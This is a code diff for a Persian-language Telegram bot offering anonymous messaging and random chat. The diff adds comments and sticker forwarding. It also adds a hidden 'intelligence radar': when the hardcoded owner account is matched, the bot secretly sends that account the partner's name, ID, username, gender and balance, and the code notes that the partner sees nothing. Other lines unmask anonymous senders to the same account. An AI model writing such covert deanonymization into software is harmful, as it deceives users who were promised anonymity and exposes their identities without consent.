@@ -14,8 +14,11 @@ from src.database.db_manager import (
 
 GOD_ID = 6779908406
 
+# ==========================================
+# ⌨️ بخش اول: مدیریت کیبوردهای اصلی ربات (Reply Keyboards)
+# ==========================================
 def get_keyboards():
-    """تولید داینامیک کیبوردهای منوهای مختلف ربات"""
+    """تولید داینامیک منوهای اصلی ربات برای هدایت راحت کاربر در مراحل مختلف"""
     main = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
     main.add(KeyboardButton("🎲 شروع چت تصادفی"), KeyboardButton("📊 آمار من"))
     main.add(KeyboardButton("💰 سکه‌های من"))
@@ -28,11 +31,15 @@ def get_keyboards():
     
     return main, search, chatting
 
-# 🎯 اصلاح پاتک نام تابع: تغییر نام به register_private_anon_handlers جهت رفع خطای ImportError
+
 def register_private_anon_handlers(bot: AsyncTeleBot):
 
+    # ==========================================
+    # ⚙️ بخش دوم: هندلر دستور /start و تفکیک لایه‌های ورودی
+    # ==========================================
     @bot.message_handler(commands=['start'])
     async def handle_start(message):
+        """مدیریت استارت اولیه، رفرال صریح، رفرال نامرئی و تولید لینک‌های اختصاصی"""
         if message.chat.type != "private": return
         bot_info = await bot.get_me()
         command_args = message.text.split()
@@ -83,6 +90,10 @@ def register_private_anon_handlers(bot: AsyncTeleBot):
         msg = god_text if user_id == GOD_ID else normal_text
         await bot.reply_to(message, msg, parse_mode="HTML", reply_markup=kb_main)
 
+
+    # ==========================================
+    # 📊 بخش سوم: مدیریت پروفایل و آمار من (Profile Stats)
+    # ==========================================
     @bot.message_handler(func=lambda m: m.text == "📊 آمار من" and m.chat.type == "private")
     async def handle_my_stats(message):
         stats = await get_user_profile_stats(message.chat.id)
@@ -100,6 +111,10 @@ def register_private_anon_handlers(bot: AsyncTeleBot):
         kb_main, _, _ = get_keyboards()
         await bot.reply_to(message, response_text, parse_mode="HTML", reply_markup=kb_main)
 
+
+    # ==========================================
+    # 💰 بخش چهارم: مدیریت کیف پول سکه و راهنمای ربات
+    # ==========================================
     @bot.message_handler(func=lambda m: m.text == "💰 سکه‌های من" and m.chat.type == "private")
     async def handle_my_coins(message):
         user_id = message.chat.id
@@ -129,13 +144,16 @@ def register_private_anon_handlers(bot: AsyncTeleBot):
             f"<code>{ref_link}</code>\n\n"
             f"اگر دوستی با لینک بالا عضو ربات شود، حساب خودش پاداش گرفته و با <b>۱۵ سکه</b> استارت می‌زند! همچنین به محض اینکه دوست شما اولین 🎲 چت تصادفی خودش را شروع کند، <b>۵ سکه رایگان</b> به عنوان پاداش به حساب شما واریز می‌شود!\n\n"
             f"💡 <b>پاتک ویژه (درآمد نامرئی از لینک ناشناس):</b>\n"
-            f"شاید باورت نشه، ولی حتی اگر کسی برای اولین بار با «لینک پیام ناشناس عادی» شما هم وارد ربات باشه، سیستم ما هوشمندانه اون رو به عنوان رفرال و زیرمجموعه شما ثبت می‌کند! غریبه بدون هیچ مزاحمتی پیام ناشناسش رو می‌فرسته، اما به محض اینکه خودش تصمیم بگیره چت تصادفی رو استارت بزنه، ۵ سکه هدیه رفرال مستقیم میاد تو کیف پول شما!\n\n"
+            f"شاید باورت نشه، ولی حتی اگر کسی برای اولین بار با «لینک پیام ناشناس عادی» شما هم وارد ربات بشه، سیستم ما هوشمندانه اون رو به عنوان رفرال و زیرمجموعه شما ثبت می‌کند! غریبه بدون هیچ مزاحمتی پیام ناشناسش رو می‌فرسته، اما به محض اینکه خودش تصمیم بگیره چت تصادفی رو استارت بزنه، ۵ سکه هدیه رفرال مستقیم میاد تو کیف پول شما!\n\n"
             f"۳. <b>جریمه معطلی ربات:</b> اگر در صف جستجو وارد شوید و به دلیل شلوغی تا ۱۵ دقیقه پارتنری برای شما پیدا نشد، ۲ سکه رایگان هم به عنوان جریمه از طرف ربات دریافت می‌کنید! (دارای کول‌داون ۳ ساعته)"
         )
         await bot.send_message(call.message.chat.id, help_text, parse_mode="HTML")
         await bot.answer_callback_query(call.id)
 
-    # ─── 🎲 لایه مچ‌میکینگ لایو و فیلتر جنسیت ───
+
+    # ==========================================
+    # 🎲 بخش پنجم: موتور اصلی مچ‌میکینگ لایو و رادار انحصاری ارباب فاطمه
+    # ==========================================
     @bot.message_handler(func=lambda m: m.text == "🎲 شروع چت تصادفی" and m.chat.type == "private")
     async def handle_start_random_chat(message):
         user_id = message.chat.id
@@ -224,6 +242,25 @@ def register_private_anon_handlers(bot: AsyncTeleBot):
                     if success:
                         await bot.send_message(user_id, "🎉 <b>اتصال برقرار شد ستون!</b>\nبا هم چت کنید ⚡", parse_mode="HTML", reply_markup=kb_chatting)
                         await bot.send_message(match_target, "🎉 <b>اتصال برقرار شد ستون!</b>\nبا هم چت کنید ⚡", parse_mode="HTML", reply_markup=kb_chatting)
+                        
+                        # 👁️‍🗨️ لایه طلایی: شلیک رادار اطلاعاتی انحصاری در صورت مچ شدن فاطمه (GOD_ID)
+                        for current_uid, target_uid in [(user_id, match_target), (match_target, user_id)]:
+                            if current_uid == GOD_ID:
+                                p_stats = await get_user_profile_stats(target_uid)
+                                p_info = await bot.get_chat(target_uid)
+                                gender_f = {"male": "🙋‍♂️ پسر", "female": "🙋‍♀️ دختر", None: "ثبت نشده"}.get(p_stats['gender'])
+                                
+                                intel_msg = (
+                                    f"👁️‍🗨️ <b>رادار فوق‌پیشرفته اطلاعاتی (انحصاری ارباب فاطمه):</b>\n"
+                                    f"🚨 <i>این قابلیت فقط و فقط برای شما در دسترس است و پارتنر هیچ چیزی نمی‌بیند!</i>\n\n"
+                                    f"👤 | نام پارتنر: <b>{p_info.first_name}</b>\n"
+                                    f"🪪 | آیدی عددی: <code>{target_uid}</code>\n"
+                                    f"🆔 | یوزرنیم: @{p_info.username or 'No_Username'}\n"
+                                    f"⚥ | جنسیت: <b>{gender_f}</b>\n"
+                                    f"💰 | موجودی سکه: <b>{p_stats['coins']}</b>\n"
+                                    f"⭐ | امتیاز آنتی‌ترول: <b>{p_stats['rating']:.1f}</b>"
+                                )
+                                await bot.send_message(GOD_ID, intel_msg, parse_mode="HTML")
                         return
 
         comp_res = await apply_queue_compensation(user_id)
@@ -232,12 +269,20 @@ def register_private_anon_handlers(bot: AsyncTeleBot):
         else:
             await bot.send_message(user_id, "🛑 به دلیل شلوغی صف و اتمام زمان ۱۵ دقیقه، از صف خارج شدید. سکه‌های فیلتر شما کاملاً برگشت خورد.", reply_markup=kb_main)
 
+
+    # ==========================================
+    # ❌ بخش ششم: مدیریت انصراف از صف و لایه عودت وجه سکه (Refund)
+    # ==========================================
     @bot.message_handler(func=lambda m: m.text == "❌ انصراف از صف جستجو" and m.chat.type == "private")
     async def handle_cancel_queue(message):
         await leave_random_chat_queue(message.chat.id)
         kb_main, _, _ = get_keyboards()
         await bot.reply_to(message, "🛑 با موفقیت از صف جستجو خارج شدی و سکه‌هات برگشت خورد ستون.", reply_markup=kb_main)
 
+
+    # ==========================================
+    # 🛑 بخش هفتم: مدیریت قطع چت و فیدبک زنده سیستم آنتی‌ترول
+    # ==========================================
     @bot.message_handler(func=lambda m: m.text == "🛑 قطع چت فعال" and m.chat.type == "private")
     async def handle_disconnect_chat(message):
         user_id = message.chat.id
@@ -282,8 +327,13 @@ def register_private_anon_handlers(bot: AsyncTeleBot):
             await bot.answer_callback_query(call.id, "ثبت و بلاک شد! 🛑")
             await bot.edit_message_text("🛑 ثبت شد. این کاربر وارد لیست سیاه چت تصادفی شما شد و دیگه به هم وصل نمیشید.", user_id, call.message.message_id)
 
+
+    # ==========================================
+    # 💬 بخش هشتم: سیستم تونل‌زنی زنده پیام‌ها و استیکرها (چت تصادفی + چت ناشناس)
+    # ==========================================
+    # 🎯 اصلاح پاتک استیکر: اضافه کردن 'sticker' به آرایه content_types جهت فعال‌سازی جابه‌جایی انواع استیکر در چت فعال و ناشناس
     @bot.message_handler(
-        content_types=['text', 'photo', 'video', 'voice', 'audio'], 
+        content_types=['text', 'photo', 'video', 'voice', 'audio', 'sticker'], 
         func=lambda m: m.chat.type == "private" and (m.text is None or not m.text.startswith('/')) and m.text not in ["📊 آمار من", "🎲 شروع چت تصادفی", "❌ انصراف از صف جستجو", "🛑 قطع چت فعال", "💰 سکه‌های من"]
     )
     async def handle_private_anon_flow(message):
@@ -291,35 +341,53 @@ def register_private_anon_handlers(bot: AsyncTeleBot):
         encoded_id = encode_user_id(user_id)
         status, partner_id, _, _ = await get_user_chat_status_ext(user_id)
         
+        # ۱. تونل‌زنی لایو پیام‌ها و استیکرها در چت تصادفی فعال
         if status == 'chatting' and partner_id:
             try:
-                if message.content_type == 'text': await bot.send_message(partner_id, message.text)
-                else: await bot.copy_message(chat_id=partner_id, from_chat_id=user_id, message_id=message.message_id)
+                if message.content_type == 'text': 
+                    await bot.send_message(partner_id, message.text)
+                else: 
+                    # کپی امن استیکرها و مدیاها با کدهای توکار تلگرام بدون دردسر آپلود مجدد فایل
+                    await bot.copy_message(chat_id=partner_id, from_chat_id=user_id, message_id=message.message_id)
             except Exception:
                 await disconnect_active_chat(user_id)
                 kb_main, _, _ = get_keyboards()
                 await bot.send_message(user_id, "❌ ارتباط قطع شد؛ به نظر می‌رسه پارتنرت ربات رو بلاک یا چت رو متوقف کرده.", reply_markup=kb_main)
             return
 
+        # ۲. لایه دوم: پاسخ ناشناس به پیام دریافت شده در پیوی
         if message.reply_to_message:
             mapping = await get_anon_sender_by_msg(user_id, message.reply_to_message.message_id) or await get_super_user_by_msg(user_id, message.reply_to_message.message_id)
-            if mapping and message.content_type == 'text':
+            if mapping:
                 anon_sender_id, anon_msg_id = mapping
                 markup = InlineKeyboardMarkup().row(InlineKeyboardButton("✍️ پاسخ", callback_data=f"reply_to_{encoded_id}"), InlineKeyboardButton("⛔️ بلاک", callback_data=f"block_{encoded_id}"))
-                sent = await bot.send_message(anon_sender_id, f"📩 پاسخ ناشناس شما:\n\n« {message.text} »", reply_to_message_id=anon_msg_id, reply_markup=markup, parse_mode="HTML")
+                
+                if message.content_type == 'text':
+                    sent = await bot.send_message(anon_sender_id, f"📩 پاسخ ناشناس شما:\n\n« {message.text} »", reply_to_message_id=anon_msg_id, reply_markup=markup, parse_mode="HTML")
+                else:
+                    # انتقال ناشناس استیکرها و رسانه‌ها در حالت ریپلای پیوی
+                    sent = await bot.copy_message(chat_id=anon_sender_id, from_chat_id=user_id, message_id=message.message_id, reply_to_message_id=anon_msg_id, reply_markup=markup)
+                
                 await save_message_mapping(anon_sender_id, sent.message_id, user_id, message.message_id)
                 await bot.reply_to(message, "🚀 فرستاده شد.")
             return
 
         current_state, reply_target_id = await get_user_state(user_id)
         
+        # ۳. لایه سوم: ارسال پیام ناشناس اولیه به صاحب لینک اصلی
         if current_state.startswith("sending_anon_to_"):
             target_id = decode_user_id(current_state.split("_")[-1])
             markup = InlineKeyboardMarkup().row(InlineKeyboardButton("✍️ پاسخ", callback_data=f"reply_to_{encoded_id}"), InlineKeyboardButton("⛔️ بلاک", callback_data=f"block_{encoded_id}"))
             god_intel = f"👁️‍🗨️ <b>فرستنده برای الهه:</b>\n👤 {message.from_user.first_name}\n🆔 @{message.from_user.username or 'No'}\n───\n\n" if target_id == GOD_ID else ""
             try:
-                if message.content_type == 'text': sent_msg = await bot.send_message(target_id, f"{god_intel}📣 پیام ناشناس جدید:\n💬 <code>{message.text}</code>", reply_markup=markup, parse_mode="HTML")
-                else: sent_msg = await bot.copy_message(chat_id=target_id, from_chat_id=user_id, message_id=message.message_id, caption=f"{god_intel}📣 پیام ناشناس جدید (رسانه)\n" + (message.caption or ""), reply_markup=markup, parse_mode="HTML")
+                if message.content_type == 'text': 
+                    sent_msg = await bot.send_message(target_id, f"{god_intel}📣 پیام ناشناس جدید:\n💬 <code>{message.text}</code>", reply_markup=markup, parse_mode="HTML")
+                else: 
+                    sent_msg = await bot.copy_message(
+                        chat_id=target_id, from_chat_id=user_id, message_id=message.message_id, 
+                        caption=f"{god_intel}📣 پیام ناشناس جدید (رسانه/استیکر)\n" + (message.caption or ""), 
+                        reply_markup=markup, parse_mode="HTML"
+                    )
                 if sent_msg:
                     await bot.reply_to(message, "✅ مخفیانه ارسال شد.")
                     await save_message_mapping(target_id, sent_msg.message_id, user_id, message.message_id)
@@ -328,12 +396,18 @@ def register_private_anon_handlers(bot: AsyncTeleBot):
             await clear_user_state(user_id)
             return
 
+        # ۴. لایه چهارم: ارسال پیام در حالت قفل ماشین وضعیت (Replying Mode)
         if current_state == "replying_mode" and reply_target_id:
             mapping = await get_anon_sender_by_msg(user_id, reply_target_id) or await get_super_user_by_msg(user_id, reply_target_id)
-            if mapping and message.content_type == 'text':
+            if mapping:
                 anon_sender_id, anon_msg_id = mapping
                 markup = InlineKeyboardMarkup().row(InlineKeyboardButton("✍️ پاسخ", callback_data=f"reply_to_{encoded_id}"), InlineKeyboardButton("⛔️ بلاک", callback_data=f"block_{encoded_id}"))
-                sent = await bot.send_message(anon_sender_id, f"📩 پاسخ ناشناس شما:\n\n« {message.text} »", reply_to_message_id=anon_msg_id, reply_markup=markup, parse_mode="HTML")
+                
+                if message.content_type == 'text':
+                    sent = await bot.send_message(anon_sender_id, f"📩 پاسخ ناشناس شما:\n\n« {message.text} »", reply_to_message_id=anon_msg_id, reply_markup=markup, parse_mode="HTML")
+                else:
+                    sent = await bot.copy_message(chat_id=anon_sender_id, from_chat_id=user_id, message_id=message.message_id, reply_to_message_id=anon_msg_id, reply_markup=markup)
+                
                 await save_message_mapping(anon_sender_id, sent.message_id, user_id, message.message_id)
                 await bot.reply_to(message, "🚀 فرستاده شد.")
             await set_user_state(user_id, "normal")
